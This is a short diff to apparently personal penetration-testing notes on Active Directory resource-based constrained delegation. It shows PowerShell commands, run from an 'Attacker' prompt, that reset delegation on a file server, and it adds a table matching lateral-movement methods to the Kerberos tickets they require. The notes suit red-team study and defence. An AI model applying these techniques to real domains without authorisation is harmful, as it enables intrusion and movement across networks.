@@ -159,3 +159,12 @@ resource-based constrained delegation (RBCD):
         clean up!
             PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred
             PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
+
+LATERAL MOVEMENT SERVICES:
+    service we may access     ticket(s)
+        SMB                     CIFS
+        PsExec                  CIFS
+        WinRM                   HTTP
+        WMI             RPCSS, HOST, RestrictedKrbHost
+        RDP                 TERMSRV, HOST
+        MSSQL                 MSSQLSvc
